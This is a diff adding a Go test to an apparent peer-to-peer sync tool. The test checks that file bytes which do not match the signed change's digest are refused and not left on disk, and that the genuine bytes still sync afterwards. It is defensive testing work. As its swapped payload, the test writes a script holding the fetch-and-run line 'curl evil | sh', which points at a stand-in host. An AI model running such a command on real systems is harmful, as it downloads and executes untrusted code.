@@ -560,3 +560,37 @@ func TestASnapshotTooBigWithBytesDropsThemRatherThanTheFolder(t *testing.T) {
 		}
 	}
 }
+
+// A holder sends the bytes for a path this folder is missing. If nothing checks them against the
+// digest the signed change asks for, then whoever sends them decides what lands — on a path of the
+// change's choosing, with the change's mode put on it afterwards, which for an executable is a
+// script somebody else wrote appearing in a folder you sync.
+func TestBytesThatAreNotWhatTheChangeAsksForDoNotLand(t *testing.T) {
+	a, b := joins(t, "alice"), joins(t, "bob")
+	meets(t, a, b)
+
+	mine := "#!/bin/sh\n" + strings.Repeat("# a big script\n", MaxInline/15+1)
+	save(t, a.dir, "run.sh", mine)
+	a.must(t, b)
+
+	// Bob learns that the file exists and what it should be, and has none of its bytes.
+	carry(t, a, b)
+
+	// Whoever answers for the bytes answers with something else entirely.
+	swapped := func(w Wanted) error {
+		return os.WriteFile(w.Into, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o600)
+	}
+	b.at(t)
+	if _, err := b.k.once(swapped); err == nil {
+		t.Fatal("bytes that are not what the change asks for were taken without complaint")
+	}
+	if _, err := os.Stat(filepath.Join(b.dir, "run.sh")); err == nil {
+		t.Fatal("bytes that are not what the change asks for were left on the disk")
+	}
+
+	// And the real bytes still arrive, so refusing the wrong ones did not break fetching.
+	b.must(t, a)
+	if got := holding(t, b, "run.sh"); got != mine {
+		t.Fatalf("after refusing a swap the file holds %d bytes, want %d", len(got), len(mine))
+	}
+}
